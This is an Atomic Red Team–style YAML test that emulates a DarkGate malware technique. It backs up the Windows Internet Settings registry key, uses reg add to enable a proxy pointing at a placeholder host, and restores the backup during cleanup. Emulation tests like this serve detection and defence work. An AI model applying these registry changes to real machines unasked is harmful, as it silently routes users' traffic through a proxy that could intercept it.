# Adapted from Atomic Red Team - Modify Registry
# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1112
# Original auto_generated_guid: d88a3d3b-d016-4939-a745-03638aafd21b

---
api_version: 2.0
uuid: 8ba8fcf1-348d-4979-a779-341c862525e9
name: Set-Up Proxy Server
authors:
  - isaac_fletcher
  - Atomic Red Team
description: |
  A modification registry to setup proxy server. This technique was seen in DarkGate malware as part of its installation.

requirements:
  platforms:
    - os: windows
  superuser: false

args:
  - name: proxy_server
    description: Proxy server to be set up
    type: string
    default: "proxy.atomic-test.com:8080"
  - name: backup_location
    description: Path where registry backup will be saved
    type: path
    default: "C:\\Users\\Public\\backup.reg"

steps:
  - name: backup_registry
    executor: cmd.exe
    inline: |
      reg export "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" "{{.Args.backup_location}}" /y 2>nul

  - name: setup_proxy_server
    executor: cmd.exe
    inline: |
      reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
      reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "{{.Args.proxy_server}}" /f
    cleanup:
      executor: cmd.exe
      inline: |
        reg import "{{.Args.backup_location}}" 2>nul
        del "{{.Args.backup_location}}" /f /q 2>nul
